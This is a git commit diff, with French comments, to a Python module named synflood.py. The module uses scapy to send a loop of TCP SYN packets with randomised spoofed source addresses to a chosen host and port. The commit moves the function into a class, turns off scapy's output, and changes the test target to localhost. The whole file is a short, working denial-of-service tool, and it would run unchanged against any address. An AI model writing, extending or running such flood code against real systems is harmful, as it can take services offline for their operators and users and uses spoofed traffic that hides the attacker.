15edeccf64e080eba25f5fc4d365f7d51a566bd3
Macareux-moine <fakirefak@gmail.com>
2024-04-26 16:31:42 +0200

    version fonctionne avec parametre statique

--- synflood/modules/synflood.py
+++ synflood/modules/synflood.py
@@ -1,17 +1,19 @@
 from scapy.all import *
 
 # Définition de la fonction d'attaque SYN flood
-def syn(cible, port, nbrpaquet):
-    # Boucle  envois
-    for _ in range(nbrpaquet):
-        # Création du paquet SYN avec une adresse IP source aléatoire et un numéro de port source aléatoire
-        ip = IP(dst=cible, src=RandIP())  # adresse IP source aléatoire
-        tcpt = TCP(dport=port, flags="S")  # paquet TCP avec le flag SYN
-        # Envoie paquet
-        send(ip/tcpt)
+class ENVOIS:
+    def syn(cible, port, nbrpaquet):
+        # Boucle  envois
+        for _ in range(nbrpaquet):
+            # Création du paquet SYN avec une adresse IP source aléatoire et un numéro de port source aléatoire
+            ip = IP(dst=cible, src=RandIP())  # adresse IP source aléatoire
+            tcpsyn = TCP(dport=port, flags="S")  # paquet TCP avec le flag SYN
+            # Envoie paquet
+            send(ip/tcpsyn,  verbose=False) #verbose en false assure que je attend pas de reponse
 
 # paramètres de testes
-cible= "192.168.1.1"  # cible
+cible= "127.0.0.1"  # cible
 port= 80  # Port 
 nbrpaquet = 1000  # nbr envois
-syn(cible, port, nbrpaquet)
+
+ENVOIS.syn(cible, port, nbrpaquet)
